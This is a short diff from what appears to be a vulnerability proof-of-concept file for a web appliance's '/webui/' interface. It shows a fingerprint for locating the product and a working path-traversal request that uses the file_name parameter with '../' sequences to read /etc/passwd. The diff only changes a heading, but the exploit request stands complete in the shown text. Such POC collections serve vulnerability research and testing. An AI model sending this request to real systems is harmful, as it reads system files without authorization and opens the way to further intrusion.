@@ -6,7 +6,7 @@
 body="webui/js/jquerylib/jquery-1.7.2.min.js"
 ```
 
-## poc
+## POC
 ```
 GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1
 
